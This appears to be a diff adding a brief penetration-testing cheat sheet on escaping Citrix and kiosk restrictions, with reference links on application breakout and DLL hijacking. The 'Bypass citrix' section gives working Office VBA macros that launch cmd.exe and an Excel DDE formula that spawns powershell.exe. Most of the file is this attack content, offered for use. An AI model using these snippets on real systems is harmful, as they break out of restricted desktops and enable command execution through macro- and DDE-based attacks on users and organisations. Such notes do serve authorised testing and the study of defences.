@@ -1,0 +1,26 @@
+# citrix
+# References
+	https://blog.netspi.com/breaking-out-of-applications-deployed-via-terminal-services-citrix-and-kiosks/
+	https://www.corelan.be/index.php/2010/08/25/dll-hijacking-kb-2269637-the-unofficial-list/
+	https://twitter.com/asintsov/status/57374476114989056
+	http://www.computerworld.com/article/2515392/security0/hacking-toolkit-publishes-dll-hijacking-exploit.html
+	http://forums.anandtech.com/showthread.php?t=25331
+	http://www.techpowerup.com/forums/threads/hijack-log.203010/
+	http://www.tarasco.org/security/Process_Injector/
+	https://www.exploit-db.com/dll-hijacking-vulnerable-applications/
+
+# Bypass citrix
+1) Macro in Office Suite
+
+	Option 1:
+		Shell "cmd.exe", vbMaximizedFocus 
+	
+	Option 2:
+		Dim wsh As Object
+		Set wsh = VBA.CreateObject("WScript.Shell")
+		Dim waitOnReturn As Boolean: waitOnReturn = True
+		Dim windowStyle As Integer: windowStyle = 1
+		wsh.Run "cmd.exe", windowStyle, waitOnReturn
+
+3) Excel:
+	=cmd|' /C powershell.exe'!A0
